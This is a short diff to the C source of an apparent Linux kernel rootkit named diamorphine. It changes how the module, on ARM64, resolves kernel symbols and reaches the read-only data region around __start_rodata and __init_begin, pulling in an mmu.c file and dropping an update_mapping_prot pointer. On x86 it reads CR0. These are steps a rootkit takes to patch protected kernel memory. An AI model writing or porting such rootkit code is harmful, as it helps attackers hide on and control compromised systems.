@@ -30,11 +30,11 @@
 #endif
 
 #include "diamorphine.h"
+#include "mmu.c"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
 #elif IS_ENABLED(CONFIG_ARM64)
-void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata;
 unsigned long init_begin;
 #define section_size init_begin - start_rodata
@@ -408,7 +408,6 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
 	start_rodata = (unsigned long)resolve_sym("__start_rodata");
 	init_begin = (unsigned long)resolve_sym("__init_begin");
 #endif
